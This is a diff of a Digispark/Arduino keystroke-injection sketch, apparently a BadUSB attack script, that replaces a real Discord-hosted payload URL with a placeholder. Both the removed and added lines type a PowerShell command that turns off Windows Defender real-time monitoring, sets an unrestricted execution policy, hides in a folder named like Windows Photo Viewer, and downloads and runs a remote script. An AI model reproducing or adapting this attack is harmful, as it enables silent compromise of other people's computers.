@@ -18,7 +18,7 @@ void loop() { //depending on how slow the target computer is you may want to add
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true ; Set-ExecutionPolicy Unrestricted ; mkdir 'C:/Program Files/Windows Photo Viewer/' ; cd 'C:/Program Files/Windows Photo Viewer/' ; powershell -command '& { iwr https://cdn.discordapp.com/attachments/670307829789360128/670330053787123732/bgpl.ps1 -OutFile bgpl.ps1 }'; ./bgpl.ps1");
+  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true ; Set-ExecutionPolicy Unrestricted ; mkdir 'C:/Program Files/Windows Photo Viewer/' ; cd 'C:/Program Files/Windows Photo Viewer/' ; powershell -command '& { iwr URL-THAT-HOSTS-PAYLOAD-HERE.com/payload.ps1 -OutFile bgpl.ps1 }'; ./bgpl.ps1");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
